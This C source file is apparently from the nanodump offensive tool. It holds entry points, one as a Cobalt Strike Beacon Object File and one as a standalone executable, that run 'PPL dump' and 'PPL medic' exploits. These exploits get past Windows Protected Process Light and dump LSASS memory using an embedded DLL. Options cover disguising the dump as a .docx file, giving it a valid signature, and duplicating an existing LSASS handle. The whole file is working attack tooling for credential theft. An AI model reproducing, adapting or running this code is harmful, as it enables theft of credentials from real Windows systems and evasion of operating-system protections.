#include "ppl/ppl.h"

#if defined(PPL_DUMP) && defined(BOF)

#include "ppl_dump.c"
#include "ppl_utils.c"
#include "../utils.c"
#include "../dinvoke.c"
#include "../syscalls.c"
#include "../token_priv.c"
#include "../impersonate.c"

void go(char* args, int length)
{
    datap          parser                    = { 0 };
    BOOL           duplicate_handle          = FALSE;
    LPCSTR         dump_path                 = NULL;
    BOOL           use_valid_sig             = FALSE;
    unsigned char* nanodump_ppl_dump_dll     = NULL;
    int            nanodump_ppl_dump_dll_len = 0;

    BeaconDataParse(&parser, args, length);
    dump_path = BeaconDataExtract(&parser, NULL);
    use_valid_sig = (BOOL)BeaconDataInt(&parser);
    duplicate_handle = (BOOL)BeaconDataInt(&parser);
    nanodump_ppl_dump_dll = (unsigned char*)BeaconDataExtract(&parser, &nanodump_ppl_dump_dll_len);

    run_ppl_dump_exploit(
        nanodump_ppl_dump_dll,
        nanodump_ppl_dump_dll_len,
        dump_path,
        use_valid_sig,
        duplicate_handle);
}

#elif defined(PPL_DUMP) && defined(EXE)

#include "ppl/ppl_dump.h"

#ifdef _WIN64
 #include "nanodump_ppl_dump_dll.x64.h"
#else
 #include "nanodump_ppl_dump_dll.x86.h"
#endif

void usage(char* procname)
{
    PRINT("usage: %s --write C:\\Windows\\Temp\\doc.docx [--valid] [--duplicate] [--help]", procname);
    PRINT("Dumpfile options:");
    PRINT("    --write DUMP_PATH, -w DUMP_PATH");
    PRINT("            filename of the dump");
    PRINT("    --valid, -v");
    PRINT("            create a dump with a valid signature");
    PRINT("Obtain an LSASS handle via:");
    PRINT("    --duplicate, -d");
    PRINT("            duplicate an existing " LSASS " handle");
    PRINT("Help:");
    PRINT("    --help, -h");
    PRINT("            print this help message and leave");
}

int main(int argc, char* argv[])
{
    BOOL   duplicate_handle = FALSE;
    LPCSTR dump_path        = NULL;
    BOOL   use_valid_sig    = FALSE;

#ifdef _M_IX86
    if(local_is_wow64())
    {
        PRINT_ERR("Nanodump does not support WoW64");
        return -1;
    }
#endif

    for (int i = 1; i < argc; ++i)
    {
        if (!strncmp(argv[i], "-v", 3) ||
            !strncmp(argv[i], "--valid", 8))
        {
            use_valid_sig = TRUE;
        }
        else if (!strncmp(argv[i], "-w", 3) ||
                 !strncmp(argv[i], "--write", 8))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --write value");
                return 0;
            }
            dump_path = argv[++i];
        }
        else if (!strncmp(argv[i], "-d", 3) ||
                 !strncmp(argv[i], "--duplicate", 12))
        {
            duplicate_handle = TRUE;
        }
        else if (!strncmp(argv[i], "-h", 3) ||
                 !strncmp(argv[i], "--help", 7))
        {
            usage(argv[0]);
            return 0;
        }
        else
        {
            PRINT("invalid argument: %s", argv[i]);
            return 0;
        }
    }

    if (!dump_path)
    {
        PRINT("You need to provide the --write parameter");
        return 0;
    }

    if (!is_full_path(dump_path))
    {
        PRINT("You need to provide the full path: %s", dump_path);
        return 0;
    }

    run_ppl_dump_exploit(
        nanodump_ppl_dump_dll,
        nanodump_ppl_dump_dll_len,
        dump_path,
        use_valid_sig,
        duplicate_handle);

    return 0;
}

#elif defined(PPL_MEDIC) && defined(BOF)

#include "ppl_medic.c"
#include "ppl_medic_client.c"
#include "ppl_utils.c"
#include "../handle.c"
#include "../utils.c"
#include "../dinvoke.c"
#include "../syscalls.c"
#include "../token_priv.c"
#include "../impersonate.c"

void go(char* args, int length)
{
    datap          parser                     = { 0 };
    unsigned char* nanodump_ppl_medic_dll     = NULL;
    int            nanodump_ppl_medic_dll_len = 0;

    BeaconDataParse(&parser, args, length);
    nanodump_ppl_medic_dll = (unsigned char*)BeaconDataExtract(&parser, &nanodump_ppl_medic_dll_len);

    run_ppl_medic_exploit(
        nanodump_ppl_medic_dll,
        nanodump_ppl_medic_dll_len);
}

#elif defined(PPL_MEDIC) && defined(EXE)

#include "ppl/ppl_medic.h"

#include "nanodump_ppl_medic_dll.x64.h"

int main(int argc, char* argv[])
{
    if (argc > 1)
    {
        PRINT("This binary doesn't take any parameteres because all the 'dump options' are hardcoded in NanoDumpPPLMedic");
        PRINT("The idea here is to avoid the interaction between processes as much as possible");
        PRINT("Modify the first lines of NanoDumpPPLMedic in order to customize how LSASS is dumped");
        return 0;
    }

    run_ppl_medic_exploit(
        nanodump_ppl_medic_dll,
        nanodump_ppl_medic_dll_len);

    return 0;
}

#endif
